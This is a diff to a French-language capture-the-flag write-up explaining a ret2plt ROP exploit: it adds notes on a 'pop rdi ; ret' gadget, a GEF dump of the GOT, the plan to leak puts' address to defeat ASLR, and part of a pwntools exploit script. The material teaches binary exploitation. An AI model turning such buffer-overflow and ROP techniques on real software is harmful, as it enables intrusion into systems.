@@ -292,7 +292,25 @@ Gadgets information
 Unique gadgets found: 93
 ```
 
-Nous avons un gadget particulièrement intéréssant dans ce binaire : `pop rdi ; ret` à l'adresse `0x00000000004006d3`.
+Nous avons un gadget particulièrement intéréssant dans ce binaire : `pop rdi ; ret` à l'adresse `0x00000000004006d3`. Cette instruction permet de passer un 1er argument à une fonction.<br/>
+Le but va etre d'effectuer un **ret2plt** afin d'exécuter une fonction contenue dans la GOT (ici puts car system n'est pas dans la GOT du programme) :
+
+```py
+gef➤  got
+
+GOT protection: Partial RelRO | GOT functions: 4
+ 
+[0x601018] puts@GLIBC_2.2.5  →  0x4004e6
+[0x601020] __libc_start_main@GLIBC_2.2.5  →  0x7ffff7de7a50
+[0x601028] fgets@GLIBC_2.2.5  →  0x400506
+[0x601030] fflush@GLIBC_2.2.5  →  0x400516
+```
+
+Dans ce cas nous allons pouvoir afficher l'adresse d'une fonction de la GOT afin de calculer la distance entre cette fonction et la fonction system car l'ASLR est random mais la distance entre les fonctions dans la GOT ne change pas.
+Mais à quoi ca sert de passer à argument ? (pop rdi ; ret) Et bien cela va permettre de passer en argument à puts la valeur de l'adresse de puts dans la GOT ainsi nous pourrons calculer la différence entre cette fonction et la fonction system 
+
+
+TL;DR :
 
 ```py
 from pwn import *
@@ -306,8 +324,8 @@ libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
 
 padding = b'A' * 72 # offset to overwrite RBP
 gadget = 0x4006d3 # pop rdi ; ret
-puts_plt = elf.plt['puts'] # 0x4004e0 (PLT in GEF)
-puts_got = elf.got['puts'] # 0x601018 (GOT in GEF)
+puts_plt = elf.plt['puts'] # 0x4004e0 (plt in GEF)
+puts_got = elf.got['puts'] # 0x601018 (got in GEF)
 addr_main = elf.symbols['main'] # 0x400626 (1st Address Prologue Main Function)
 
 p.recvuntil('ROP me outside, how \'about dah?\n') # wait str to send pld
